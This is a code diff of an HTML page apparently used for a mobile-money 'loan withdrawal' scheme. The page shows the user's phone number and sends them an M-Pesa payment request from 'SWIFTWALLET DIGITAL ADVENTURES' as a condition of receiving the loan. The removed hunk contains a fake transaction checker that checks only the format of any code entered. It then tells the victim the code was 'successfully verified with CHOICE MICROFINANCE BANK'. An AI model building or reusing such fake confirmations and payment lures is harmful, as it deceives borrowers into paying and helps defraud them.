@@ -364,14 +364,6 @@
                               Processing previous withdrawal...
                         </span>
                     </div>
-    <!-- Need Help Link -->
-<div class="text-center mt-4">
-  <button 
-    onclick="openHelpModal()" 
-    class="text-sm font-medium text-blue-600 hover:text-blue-800 underline">
-    Need help? Verify my Transaction 
-  </button>
-</div>
 
                     <!-- Logos Row with Arrow Transfer Animation -->
                     <div class="flex justify-center items-center space-x-8 mt-4">
@@ -738,7 +730,7 @@
             
             <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
             <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital Adventures STK Push...</p>
-            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
+            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone (${loanData.phone}) for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
             
             <!-- Trust indicators -->
             <div class="flex justify-center items-center space-x-6 mb-6">
@@ -769,39 +761,6 @@
             </div>
         </div>
     </div>
-   <!-- Help Modal -->
-<div id="helpModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
-  <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full p-6">
-    <div class="flex justify-between items-center mb-4">
-      <h3 class="text-lg font-bold text-gray-900">Check M-Pesa Code</h3>
-      <button onclick="closeHelpModal()" class="text-gray-400 hover:text-gray-600">
-        <i class="fas fa-times"></i>
-      </button>
-    </div>
-
-    <p class="text-sm text-gray-600 mb-4">
-      Paste your M-Pesa transaction code below to verify withdrawal.
-    </p>
-
-    <input 
-      type="text" 
-      id="mpesaCodeInput" 
-      placeholder="Enter M-Pesa Code (e.g., THV5SCFSUH)" 
-      class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none form-field mb-3"
-    >
-
-    <div id="helpResult" class="text-sm mt-2"></div>
-
-    <div class="flex space-x-3 mt-6">
-      <button onclick="closeHelpModal()" class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50">
-        Cancel
-      </button>
-      <button onclick="checkMpesaCode()" class="flex-1 px-4 py-3 bg-primary text-white rounded-lg hover:bg-primary-dark">
-        Check Code
-      </button>
-    </div>
-  </div>
-</div>
 
     <footer class="text-center text-gray-400 text-sm py-6 bg-gray-900 border-t border-gray-700">
         <div class="flex flex-col items-center space-y-3">
@@ -1551,43 +1510,6 @@
                 return e.returnValue;
             }
         });
- // Open Help Modal
- function checkMpesaCode() {
-    const code = document.getElementById('mpesaCodeInput').value.trim();
-    const resultBox = document.getElementById('helpResult');
-
-    if (!code) {
-        resultBox.innerHTML = `<p class="text-red-600">⚠️ Please enter a code.</p>`;
-        return;
-    }
-
-    // Simple format check: 10+ alphanumeric characters
-    if (/^[A-Z0-9]{10,}$/i.test(code)) {
-        // Close modal
-        closeHelpModal();
-
-        // Show green success alert (reuse existing success popup styling)
-        const successAlert = document.getElementById('successAlert');
-        const successMessage = document.getElementById('successMessage');
-
-        successMessage.innerHTML = `
-          ✅ M-Pesa transaction code 
-          <span class="font-bold text-green-800">${code}</span> 
-          has been successfully verified with 
-          <span class="text-red-600 font-semibold">CHOICE MICROFINANCE BANK</span>.
-        `;
-
-        successAlert.classList.remove('hidden');
-        successAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
-
-        // Animate progress bar
-        const progressBar = document.getElementById('progressBar');
-        progressBar.classList.add('progress-bar-animated');
-    } else {
-        resultBox.innerHTML = `<p class="text-red-600">❌ Invalid code or code not found. Please try again.</p>`;
-    }
-}
-}
     </script>
 </body>
 </html>
